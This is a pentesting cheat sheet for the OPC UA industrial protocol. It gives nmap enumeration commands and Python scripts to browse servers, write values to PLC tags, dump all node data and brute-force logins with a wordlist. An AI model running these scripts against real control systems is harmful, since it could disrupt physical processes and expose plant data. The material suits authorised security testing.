# Port 4840 - OPC UA

## Table of Contents
- [Overview](#overview)
- [Enumeration](#enumeration)
- [Connect and Browse](#connect-and-browse)
- [Exploitation](#exploitation)

---

## Overview

| Port | Protocol | Description |
| :--- | :--- | :--- |
| 4840 | OPC UA | Default OPC UA port |
| 4843 | OPC UA/TLS | Secure OPC UA |

OPC UA (Unified Architecture) is an industrial communication protocol for:
- PLCs
- SCADA systems
- HMIs
- Historians

---

## Enumeration

### Quick Check (One-liner)

```shell
nmap -p 4840 --script "opcua-info" $rhost
```

### Nmap

```shell
nmap -sV -p 4840 $rhost
nmap -p 4840 --script "opcua-info" $rhost
```

### Using opcua-client-gui

```shell
# Install
pip install opcua-client

# GUI client
opcua-client
# Enter: opc.tcp://$rhost:4840
```

### Using Python opcua

```python
#!/usr/bin/env python3
from opcua import Client

url = "opc.tcp://$rhost:4840"
client = Client(url)

try:
    client.connect()
    
    # Get server info
    print(f"Server: {client.get_server_node()}")
    
    # Get endpoints
    endpoints = client.get_endpoints()
    for ep in endpoints:
        print(f"Endpoint: {ep.EndpointUrl}")
        print(f"Security: {ep.SecurityMode}")
        print(f"Policy: {ep.SecurityPolicyUri}")
        print("---")
    
finally:
    client.disconnect()
```

---

## Connect and Browse

### Anonymous Access

```python
#!/usr/bin/env python3
from opcua import Client

client = Client("opc.tcp://$rhost:4840")
client.connect()

# Browse root
root = client.get_root_node()
print(f"Root: {root}")

# Browse objects
objects = client.get_objects_node()
for child in objects.get_children():
    print(f"Object: {child.get_browse_name()}")
    
    # Browse child nodes
    for subchild in child.get_children():
        print(f"  - {subchild.get_browse_name()}")
        
        # Try to read value
        try:
            val = subchild.get_value()
            print(f"    Value: {val}")
        except:
            pass

client.disconnect()
```

### With Authentication

```python
#!/usr/bin/env python3
from opcua import Client

client = Client("opc.tcp://$rhost:4840")
client.set_user("admin")
client.set_password("password")
client.connect()

# Browse...

client.disconnect()
```

### Read Specific Node

```python
#!/usr/bin/env python3
from opcua import Client, ua

client = Client("opc.tcp://$rhost:4840")
client.connect()

# Read by NodeId
node = client.get_node("ns=2;i=2")  # Namespace 2, Identifier 2
value = node.get_value()
print(f"Value: {value}")

# Read by browse path
node = client.get_node(ua.NodeId(2, 2))
value = node.get_value()

client.disconnect()
```

---

## Exploitation

### Write to Tags (if allowed)

```python
#!/usr/bin/env python3
from opcua import Client, ua

client = Client("opc.tcp://$rhost:4840")
client.connect()

# Find writable node
node = client.get_node("ns=2;i=5")

# Write value
node.set_value(ua.DataValue(ua.Variant(1337, ua.VariantType.Int32)))
print("Value written!")

# Or set boolean
node.set_value(ua.DataValue(ua.Variant(True, ua.VariantType.Boolean)))

client.disconnect()
```

### Extract All Data

```python
#!/usr/bin/env python3
from opcua import Client

def browse_recursive(node, level=0):
    try:
        for child in node.get_children():
            name = child.get_browse_name()
            try:
                value = child.get_value()
                print(f"{'  '*level}{name}: {value}")
            except:
                print(f"{'  '*level}{name}")
            browse_recursive(child, level+1)
    except:
        pass

client = Client("opc.tcp://$rhost:4840")
client.connect()

root = client.get_objects_node()
browse_recursive(root)

client.disconnect()
```

### Brute Force Credentials

```python
#!/usr/bin/env python3
from opcua import Client

url = "opc.tcp://$rhost:4840"
users = ['admin', 'user', 'operator', 'engineer']
passwords = open('/usr/share/wordlists/rockyou.txt').read().splitlines()[:1000]

for user in users:
    for password in passwords:
        try:
            client = Client(url)
            client.set_user(user)
            client.set_password(password)
            client.connect()
            print(f"[+] Found: {user}:{password}")
            client.disconnect()
            break
        except:
            pass
```

---

## Quick Reference

| Tool | Command | Description |
| :--- | :--- | :--- |
| opcua-client | `opcua-client` | GUI client |
| Python | `Client("opc.tcp://$rhost:4840")` | Connect via Python |
| Nmap | `nmap -p 4840 --script "opcua-info" $rhost` | Enumerate |

| Port | Description |
| :--- | :--- |
| 4840 | OPC UA (unencrypted) |
| 4843 | OPC UA over TLS |
